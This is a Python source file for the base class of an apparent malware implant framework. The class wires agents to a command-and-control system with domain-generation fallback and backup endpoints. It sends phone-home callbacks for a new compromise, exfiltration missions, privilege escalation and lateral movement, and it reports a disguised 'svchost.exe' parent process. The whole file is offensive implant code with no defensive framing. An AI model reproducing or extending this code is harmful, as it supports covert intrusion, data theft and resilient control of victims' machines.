
import logging, json, uuid
from datetime import datetime
from typing import Any, Dict, Optional
from abc import ABC, abstractmethod

log = logging.getLogger("AGENT-BASE")



class BaseAgent(ABC):
    def __init__(self, codename: str):
        if type(self) is BaseAgent:
            raise TypeError("BaseAgent is abstract and cannot be instantiated directly.")
        self.codename = codename
        self.kernel: Optional[Any] = None
        self.priority = "normal"  # may be overwritten by config later
        
        # Phone-home callback system (initialized in attach_kernel)
        self.phone_home_callback: Optional[Any] = None
        self.c2_resilience_orchestrator: Optional[Any] = None

    # ------------------------------------------------------------------

    @abstractmethod
    def should_activate(self, config: Dict[str, Any]) -> bool:
        """Return True if this agent should start."""
        return self.codename in config.get("agent_whitelist", [])

    def attach_kernel(self, kernel):
        """Wire the agent to the running kernel."""
        self.kernel = kernel
        # allow config to override default priority
        cfg = getattr(kernel, "config", {})
        self.priority = cfg.get("agent_priority", {}).get(self.codename, self.priority)
        
        # Initialize C2 resilience orchestrator and phone-home callbacks
        self._initialize_c2_resilience()
        
        self._broadcast("start")

    # ------------------------------------------------------------------

    @abstractmethod
    def run(self):
        """Main agent loop stub; subclasses override."""
        log.debug("Agent %s started with priority %s", self.codename, self.priority)

    # ------------------------------------------------------------------
    def terminate(self):
        """Graceful shutdown."""
        self._broadcast("stop")
        log.debug("Agent %s terminated", self.codename)
    
    def stop(self):
        """Alias for terminate() - stops the agent gracefully."""
        self.terminate()
    
    def status(self) -> Dict[str, Any]:
        """Return agent status information."""
        return {
            'agent': self.codename,
            'priority': self.priority,
            'kernel': 'attached' if self.kernel else 'unattached',
            'timestamp': datetime.utcnow().isoformat()
        }

    # ------------------------------------------------------------------
    def _broadcast(self, event: str):
        """Send agent lifecycle telemetry via SwarmMesh Redis if available."""
        redis = getattr(getattr(self.kernel, "swarm", None), "redis", None)
        if redis:
            payload = {
                "event": event,
                "agent": self.codename,
                "priority": self.priority,
                "ts": datetime.utcnow().isoformat(),
            }
            redis.publish("agent_lifecycle", json.dumps(payload, separators=(",", ":")))
    
    # ------------------------------------------------------------------
    # C2 RESILIENCE & PHONE-HOME CALLBACK INTEGRATION
    # ------------------------------------------------------------------
    
    def _initialize_c2_resilience(self):
        """
        Initialize C2 resilience orchestrator and phone-home callbacks.
        
        This is called during attach_kernel and sets up:
        - DGA domain generator
        - Fallback resolver (primary + backups)
        - Offline mission queue
        - Phone-home callback manager
        """
        try:
            import os
            from c2_resilience_orchestrator import C2ResilienceOrchestrator
            from phone_home_callback import PhoneHomeCallback, CallbackType
            from config_encryptor import ConfigEncryptor
            
            # Load encrypted config
            config_encryptor = ConfigEncryptor(deployment_seed=self.kernel.config.get("deployment_id", "default"))
            
            try:
                config_data = self.kernel.config
            except:
                config_data = {}
            
            # Initialize C2 resilience orchestrator if config available
            if config_data.get("c2_primary") and config_data.get("c2_backups"):
                self.c2_resilience_orchestrator = C2ResilienceOrchestrator(
                    primary_endpoint=config_data.get("c2_primary"),
                    backup_endpoints=config_data.get("c2_backups", []),
                    dga_seed=config_data.get("dga_seed", "agent"),
                    dga_algorithm=config_data.get("dga_algorithm", "TLDCYCLE"),
                    dga_domain_count=config_data.get("dga_domain_count", 50)
                )
                
                log.info(f"[+] C2 Resilience Orchestrator initialized for {self.codename}")
                log.info(f"    Primary: {config_data.get('c2_primary')}")
                log.info(f"    Backups: {len(config_data.get('c2_backups', []))} available")
            
            # Initialize phone-home callback manager if config available
            if config_data.get("c2_callback_endpoint") and config_data.get("shared_secret"):
                self.phone_home_callback = PhoneHomeCallback(
                    agent_id=self.kernel.config.get("agent_id", f"agent_{uuid.uuid4().hex[:8]}"),
                    c2_endpoint=config_data.get("c2_callback_endpoint"),
                    shared_secret=config_data.get("shared_secret"),
                    queue_db=config_data.get("callback_queue_db", "phone_home_queue.db")
                )
                
                log.info(f"[+] Phone-Home Callback initialized for {self.codename}")
                log.info(f"    C2 Endpoint: {config_data.get('c2_callback_endpoint')}")
                
                # Send INITIAL callback (new compromise)
                self.send_callback_initial()
        
        except ImportError as e:
            log.warning(f"[!] C2 Resilience modules not available: {e}")
        except Exception as e:
            log.warning(f"[!] C2 Resilience initialization failed: {e}")
    
    def send_callback_initial(self, metadata: Optional[Dict[str, Any]] = None):
        """
        Send INITIAL callback (new compromise detected).
        
        Args:
            metadata: Optional additional metadata
        """
        if not self.phone_home_callback:
            return
        
        try:
            from phone_home_callback import CallbackType
            import sys
            
            callback_metadata = {
                "agent_version": "4.2.1",
                "codename": self.codename,
                "parent_process": "svchost.exe" if sys.platform == "win32" else "kernel",
            }
            
            if metadata:
                callback_metadata.update(metadata)
            
            self.phone_home_callback.send_callback(
                CallbackType.INITIAL,
                metadata=callback_metadata
            )
            log.info(f"[+] INITIAL callback sent from {self.codename}")
        
        except Exception as e:
            log.warning(f"[!] Failed to send INITIAL callback: {e}")
    
    def send_callback_mission_complete(self, mission_id: str, mission_type: str,
                                       success: bool, duration_seconds: float,
                                       metadata: Optional[Dict[str, Any]] = None):
        """
        Send MISSION_COMPLETE callback.
        
        Args:
            mission_id: ID of completed mission
            mission_type: Type of mission (file_exfil, recon, etc.)
            success: Whether mission succeeded
            duration_seconds: Mission execution duration
            metadata: Optional additional metadata
        """
        if not self.phone_home_callback:
            return
        
        try:
            from phone_home_callback import CallbackType
            
            callback_metadata = {
                "mission_id": mission_id,
                "mission_type": mission_type,
                "success": success,
                "duration_seconds": duration_seconds,
            }
            
            if metadata:
                callback_metadata.update(metadata)
            
            self.phone_home_callback.send_callback(
                CallbackType.MISSION_COMPLETE,
                metadata=callback_metadata
            )
            log.info(f"[+] MISSION_COMPLETE callback sent: {mission_id}")
        
        except Exception as e:
            log.warning(f"[!] Failed to send MISSION_COMPLETE callback: {e}")
    
    def send_callback_escalation(self, technique: str, from_privilege: str,
                                to_privilege: str, success: bool,
                                metadata: Optional[Dict[str, Any]] = None):
        """
        Send ESCALATION callback (privilege escalation successful).
        
        Args:
            technique: Escalation technique used
            from_privilege: Starting privilege level
            to_privilege: Target privilege level
            success: Whether escalation succeeded
            metadata: Optional additional metadata
        """
        if not self.phone_home_callback:
            return
        
        try:
            from phone_home_callback import CallbackType
            
            callback_metadata = {
                "technique": technique,
                "from_privilege": from_privilege,
                "to_privilege": to_privilege,
                "success": success,
            }
            
            if metadata:
                callback_metadata.update(metadata)
            
            self.phone_home_callback.send_callback(
                CallbackType.ESCALATION,
                metadata=callback_metadata
            )
            log.info(f"[+] ESCALATION callback sent: {from_privilege} -> {to_privilege}")
        
        except Exception as e:
            log.warning(f"[!] Failed to send ESCALATION callback: {e}")
    
    def send_callback_lateral(self, target_host: str, target_user: str,
                             technique: str, success: bool,
                             metadata: Optional[Dict[str, Any]] = None):
        """
        Send LATERAL callback (lateral movement / network pivot).
        
        Args:
            target_host: Target hostname or IP
            target_user: Target user account
            technique: Pivot technique used
            success: Whether lateral move succeeded
            metadata: Optional additional metadata
        """
        if not self.phone_home_callback:
            return
        
        try:
            from phone_home_callback import CallbackType
            
            callback_metadata = {
                "target_host": target_host,
                "target_user": target_user,
                "technique": technique,
                "success": success,
            }
            
            if metadata:
                callback_metadata.update(metadata)
            
            self.phone_home_callback.send_callback(
                CallbackType.LATERAL,
                metadata=callback_metadata
            )
            log.info(f"[+] LATERAL callback sent: {target_user}@{target_host}")
        
        except Exception as e:
            log.warning(f"[!] Failed to send LATERAL callback: {e}")
    
    def send_periodic_heartbeat(self, missions_completed: int,
                               uptime_seconds: int,
                               metadata: Optional[Dict[str, Any]] = None):
        """
        Send periodic HEARTBEAT callback (rate limited to once per hour).
        
        Args:
            missions_completed: Number of missions executed
            uptime_seconds: Agent uptime in seconds
            metadata: Optional additional metadata
        """
        if not self.phone_home_callback:
            return
        
        try:
            from phone_home_callback import CallbackType
            
            callback_metadata = {
                "codename": self.codename,
                "missions_completed": missions_completed,
                "uptime_seconds": uptime_seconds,
            }
            
            if metadata:
                callback_metadata.update(metadata)
            
            self.phone_home_callback.send_callback(
                CallbackType.HEARTBEAT,
                metadata=callback_metadata
            )
            log.debug(f"[+] HEARTBEAT callback sent from {self.codename}")
        
        except Exception as e:
            log.warning(f"[!] Failed to send HEARTBEAT callback: {e}")
    
    def flush_callback_queue(self):
        """
        Flush offline callback queue when C2 connection restored.
        
        Returns:
            Number of callbacks flushed
        """
        if not self.phone_home_callback:
            return 0
        
        try:
            flushed = self.phone_home_callback.flush_offline_queue()
            stats = self.phone_home_callback.get_queue_stats()
            
            log.info(f"[+] Flushed {flushed} offline callbacks")
            log.info(f"    Queue stats - Pending: {stats['pending']}, Sent: {stats['sent']}, Failed: {stats['failed']}")
            
            return flushed
        
        except Exception as e:
            log.warning(f"[!] Failed to flush callback queue: {e}")
            return 0